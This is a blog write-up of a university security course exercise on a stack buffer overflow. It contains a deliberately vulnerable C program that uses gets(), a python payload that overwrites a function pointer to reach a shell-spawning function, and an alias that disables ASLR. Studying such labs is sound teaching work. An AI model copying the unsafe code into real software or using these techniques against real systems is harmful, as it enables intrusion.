---
title: "Buffer Overflow - 2"
date: 2019-07-12T03:00:39+10:00

categories: ["Extended Security", "Musings"]

hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

# Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
	printf("Oh noe; my code flow\n");
	system("/bin/sh");
}
void lose(void) {
	system("/usr/games/cowsay `/usr/games/fortune`");
}

int main(int argc, char** argv) {
	// setup local variables
	void (*function)(void) = lose;
	char buffer[64];

    // Print hints
	printf("The winning function is at %p\n",win);
	printf("Do you remember how function pointers work ?\n");

    // get user input, save to buffer
	gets(&buffer);

    // jump to function
	printf("Preparing to jump to %p\n",function);
	fflush(stdout);
	function();

	return EXIT_SUCCESS;
}
```

# Analysis

Similar to the [previous example](../buffer-overflow-01), we need to overflow the `buffer` array and overwrite the address that `function` points to.

To our conventience, line 19 gives us the address to the `win` function - We just need to write this address through the buffer overflow attack.  
Note that we'll write this backwards due to the little endian memory structure of most systems.

_If line 19 **didn't** exist, we could use other methods to determine the function address of `win`. For example, we could use `objdump -d ./whereami` to find a delta/offset from a known address of another function._

## Address Space Layout Randomization (ASLR)

As you run the program, you would see that the address of the `win` function changes each time.

`The winning function is at 0x566261d9`  
`The winning function is at 0x565ad1d9`  
`The winning function is at 0x5663d1d9`  
`The winning function is at 0x565821d9`  
`The winning function is at 0x565e51d9`  
`The winning function is at 0x566481d9`  

This is a security feature to _(attempt to)_ prevent malicious access to the memory of programs. For example, it would _(attempt to)_ stop someone from modifying a hardcoded memory address of another program.  
But I say attempt, because there are always ways around things.

Take me for example, I don't want to keep typing in new `win` addresses - so why not disable ASLR for the duration of the program!

Here's a shell alias that I use to momentarily disable ASLR.

> `alias aslr='setarch ``uname -m`` -R'`

Simply just prepend it to any command.

For me, it made the winning function _always_ `0x565561d9`.  

```bash
python -c 'print("\x00"*64 + "\xd9\x61\x55\x56")' | aslr ./whereami

---

The winning function is at 0x565561d9
Do you remember how function pointers work ?
Preparing to jump to 0x565561d9
Oh noe; my code flow
COMP6841{Oh_Look_Youre_So_1337_now}
```